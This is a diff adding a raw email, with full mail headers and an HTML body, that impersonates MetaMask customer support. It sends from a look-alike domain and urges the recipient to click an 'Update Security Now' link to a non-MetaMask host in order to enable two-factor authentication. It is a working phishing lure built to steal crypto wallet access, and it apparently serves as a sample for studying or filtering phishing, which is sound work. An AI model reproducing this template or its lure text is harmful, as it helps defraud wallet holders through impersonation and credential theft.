@@ -1,0 +1,78 @@
+Return-Path: <postmaster@8b97b579a0.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id SKRxC/zubGeobAAAOB6+FQ
+	(envelope-from <postmaster@8b97b579a0.nxcli.io>)
+	for <info@vorteksenerji.com>; Thu, 26 Dec 2024 08:51:56 +0300
+Return-path: <postmaster@8b97b579a0.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Thu, 26 Dec 2024 08:51:56 +0300
+Received: from cloudhost-2641590.us-midwest-1.nxcli.net ([8.36.41.97]:25996)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.96.2)
+	(envelope-from <postmaster@8b97b579a0.nxcli.io>)
+	id 1tQgmp-00076A-35
+	for info@vorteksenerji.com;
+	Thu, 26 Dec 2024 08:51:56 +0300
+Received: (qmail 2054 invoked by uid 10148); 26 Dec 2024 05:46:34 +0000
+Date: 26 Dec 2024 05:46:34 +0000
+Message-ID: <20241226054634.2053.qmail@cloudhost-2641590.us-midwest-1.nxcli.net>
+To: info@vorteksenerji.com
+Subject: =?UTF-8?B?S2VlcCBZb3VyIFdhbGxldCBTZWN1cmUgd2l0aCBUd28tRmFjdG9yIEF1dGhlbnRpY2F0aW9u?=
+X-PHP-Originating-Script: 10148:mail.php
+From: MetaMask Customer Assistance <a7fqibqq@metamask-updates.net>
+Reply-To: no-reply@example.com
+Content-Type: text/html; charset=UTF-8
+X-Mailer-ID: 676cedba8e040
+X-Origin-IP: 192.168.1.133
+X-Message-ID: 414f9cad6171ab88863a77e1d913386a
+X-Origin-Time: 2024-12-26 05:46:34
+X-Campaign-ID: ef971e5695a2298f
+List-Unsubscribe: <mailto:unsubscribe@example.com>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Urgent: Enhance Security</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f9f9f9; margin: 0; padding: 0; }
+        .container { max-width: 600px; margin: 20px auto; background: #ffffff; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); overflow: hidden; }
+        .header { background-color: #f6851b; padding: 10px; text-align: center; }
+        .header img { max-width: 80px; height: auto; }
+        .content { padding: 20px; }
+        .content h2 { color: #333; font-size: 20px; text-align: center; }
+        .content p { line-height: 1.6; color: #555; font-size: 16px; text-align: justify; }
+        .cta { text-align: center; margin: 20px 0; }
+        .cta a { display: inline-block; padding: 15px 25px; color: #ffffff; background-color: #f6851b; text-decoration: none; font-weight: bold; border-radius: 5px; font-size: 16px; }
+        .cta a:hover { background-color: #e67e22; }
+        .footer { padding: 10px 20px; text-align: center; font-size: 12px; color: #aaa; background-color: #f9f9f9; }
+        .footer p { margin: 5px 0; }
+        .footer a { color: #f6851b; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/SVG_MetaMask_Icon_Color.svg" alt="MetaMask Logo">
+        </div>
+        <div class="content">
+            <h2>Urgent Security Update</h2>
+            <p>Dear User,<br>Your wallet requires an urgent security update. Protect your wallet by activating Two-Factor Authentication (2FA) now to avoid unauthorized access.</p>
+            <div class="cta">
+                <a href="https://registal.id/m?id=830458659072565277-4642">Update Security Now</a>
+            </div>
+        </div>
+        <div class="footer">
+            <p>© 2024 MetaMask. All rights reserved.</p>
+            <p>This is an automated message. Do not reply.</p>
+            <p><a href="{unsubscribe_link}">Unsubscribe</a> | <a href="https://metamask.io/">Visit MetaMask</a></p>
+        </div>
+    </div>
+</body>
+</html>
+<!-- Random-ID: 676cedba8e054 -->
